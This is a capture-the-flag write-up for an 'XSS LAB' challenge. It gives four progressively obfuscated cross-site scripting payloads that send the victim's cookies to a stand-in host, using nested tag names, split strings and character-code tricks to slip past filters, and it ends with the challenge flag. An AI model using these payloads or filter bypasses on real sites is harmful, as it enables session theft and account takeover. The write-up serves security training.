## XSS LAB

### Description

xss, EVERYWHERE

_Note_ : If your payload does not seem to work at first, please use [RequestBin](https://public.requestbin.com/) to check before contacting the support.   

**Author: algorab**

### Solution

Let's suppose we want to exfiltrate the cookies to the url `http://domain/`.

#### Step 1

Payload: 
```html
<script>document.location.replace("http://domain/?c="+document.cookie)</script>
```

#### Step 2

Payload:
```html
<scrscriptipt>document.location.replace("http://domain/?c="+document.cookie)</scrscriptipt>
```

#### Step 3

Payload:
```html
<scrscriptipt>window["docu"+"ment"].location.replace("//domain/?c="+window["docu"+"ment"]["cook"+"ie"])</scrscriptipt>
```

#### Step 4

Payload:
```html
<imimgg src=x onerror='javascscriptript:window[`docu`.concat(`ment`)].location.replace(String.fromCharCode(47).concat(String.fromCharCode(47)).concat(`domain`).concat(String.fromCharCode(47)).concat(`?c=`).concat(window[`docu`.concat(`ment`)][`coo`.concat(`kie`)]))' >
```

### Flag

`N0PS{cR05s_S1t3_Pr0_5cR1pT1nG}`